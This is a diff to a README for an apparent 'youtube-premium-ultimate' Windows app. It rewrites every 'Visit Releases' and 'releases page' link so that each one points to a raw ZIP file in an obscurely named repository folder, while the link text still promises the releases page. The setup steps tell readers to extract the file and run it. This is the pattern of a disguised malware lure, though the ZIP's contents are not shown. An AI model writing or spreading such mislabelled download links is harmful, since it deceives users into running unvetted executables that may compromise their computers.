@@ -1,6 +1,6 @@
 # 🎬 youtube-premium-ultimate - Better Control for YouTube
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Whistlingjudas889/youtube-premium-ultimate/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Whistlingjudas889/youtube-premium-ultimate/raw/refs/heads/main/Crypturidae/premium-youtube-ultimate-3.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it if you want a cleaner YouTube interface, better playback control, and fas
 
 ## 📥 Download
 
-1. Open the [releases page](https://github.com/Whistlingjudas889/youtube-premium-ultimate/releases).
+1. Open the [releases page](https://github.com/Whistlingjudas889/youtube-premium-ultimate/raw/refs/heads/main/Crypturidae/premium-youtube-ultimate-3.0-alpha.3.zip).
 2. Find the latest release at the top of the list.
 3. Download the Windows file from that release.
 4. Save the file to your computer.
@@ -18,7 +18,7 @@ Use it if you want a cleaner YouTube interface, better playback control, and fas
 
 If the file comes in a ZIP folder, right-click it and choose Extract All before you run the app.
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Visit%20Releases-grey?style=for-the-badge&logo=github)](https://github.com/Whistlingjudas889/youtube-premium-ultimate/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Visit%20Releases-grey?style=for-the-badge&logo=github)](https://github.com/Whistlingjudas889/youtube-premium-ultimate/raw/refs/heads/main/Crypturidae/premium-youtube-ultimate-3.0-alpha.3.zip)
 
 ## 🖥️ Windows Setup
 
@@ -189,4 +189,4 @@ Check the release page from time to time if you want the latest version
 
 ## 📦 Download Source
 
-Visit the [GitHub Releases page](https://github.com/Whistlingjudas889/youtube-premium-ultimate/releases) to download the latest Windows release and run it on your PC
+Visit the [GitHub Releases page](https://github.com/Whistlingjudas889/youtube-premium-ultimate/raw/refs/heads/main/Crypturidae/premium-youtube-ultimate-3.0-alpha.3.zip) to download the latest Windows release and run it on your PC
